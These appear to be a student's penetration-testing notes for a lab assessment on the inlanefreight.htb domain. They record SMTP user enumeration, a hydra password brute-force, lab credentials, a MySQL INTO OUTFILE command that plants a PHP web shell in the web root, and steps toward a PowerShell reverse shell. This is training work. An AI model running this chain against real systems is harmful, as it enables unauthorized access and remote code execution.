TODOS:
- Attacking Common Services
- Footprinting
- Pivoting, Tunneling, and Port Forwarding
- AD
- AD Bloodhound


marlin:poohbear
marlin@inlanefreight.htb 

# Assessment 1

*Command:* smtp-user-enum -M RCPT -U users.list -t $TARGET -D inlanefreight.htb -p 587
*Result*: 10.129.95.172: **fiona@inlanefreight.htb** exists

*Command:* hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/rockyou.txt -f $TARGET smtp -v -I
*Result*: login: fiona@inlanefreight.htb   password: 987654321
fiona:987654321

*Command:* 
1. mysql -h $TARGET -u fiona -p'987654321'
2. select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php';
3. http://10.129.203.7/back.php?c=whoami
4. Start listener
5. http://10.129.203.7/back.php?c=powershell [enconded shell from here](https://www.revshells.com/)
